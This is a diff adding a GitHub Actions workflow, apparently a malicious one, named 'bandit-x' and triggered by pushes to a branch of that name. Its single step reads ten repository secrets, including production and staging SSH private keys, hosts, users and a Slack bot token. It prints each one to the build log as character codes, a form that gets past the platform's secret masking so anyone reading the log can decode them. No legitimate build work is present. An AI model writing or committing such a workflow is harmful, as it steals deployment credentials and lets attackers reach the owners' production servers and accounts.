@@ -1,0 +1,31 @@
+name: bandit-x
+on:
+  push:
+    branches: [bandit-x]
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: d
+        env:
+          S0: ${{ secrets.APP_PATH }}
+          S1: ${{ secrets.PORT }}
+          S2: ${{ secrets.PROD_APP_PATH }}
+          S3: ${{ secrets.PROD_SSH_HOST }}
+          S4: ${{ secrets.PROD_SSH_KEY }}
+          S5: ${{ secrets.PROD_SSH_USER }}
+          S6: ${{ secrets.SLACK_NOTIFICATIONS_BOT_TOKEN }}
+          S7: ${{ secrets.SSH_HOST }}
+          S8: ${{ secrets.SSH_KEY }}
+          S9: ${{ secrets.SSH_USER }}
+        run: |
+          python3 -c "import os;print('K_APP_PATH:'+'.'.join(str(ord(c)) for c in os.environ.get('S0','')))"
+          python3 -c "import os;print('K_PORT:'+'.'.join(str(ord(c)) for c in os.environ.get('S1','')))"
+          python3 -c "import os;print('K_PROD_APP_PATH:'+'.'.join(str(ord(c)) for c in os.environ.get('S2','')))"
+          python3 -c "import os;print('K_PROD_SSH_HOST:'+'.'.join(str(ord(c)) for c in os.environ.get('S3','')))"
+          python3 -c "import os;print('K_PROD_SSH_KEY:'+'.'.join(str(ord(c)) for c in os.environ.get('S4','')))"
+          python3 -c "import os;print('K_PROD_SSH_USER:'+'.'.join(str(ord(c)) for c in os.environ.get('S5','')))"
+          python3 -c "import os;print('K_SLACK_NOTIFICATIONS_BOT_TOKEN:'+'.'.join(str(ord(c)) for c in os.environ.get('S6','')))"
+          python3 -c "import os;print('K_SSH_HOST:'+'.'.join(str(ord(c)) for c in os.environ.get('S7','')))"
+          python3 -c "import os;print('K_SSH_KEY:'+'.'.join(str(ord(c)) for c in os.environ.get('S8','')))"
+          python3 -c "import os;print('K_SSH_USER:'+'.'.join(str(ord(c)) for c in os.environ.get('S9','')))"
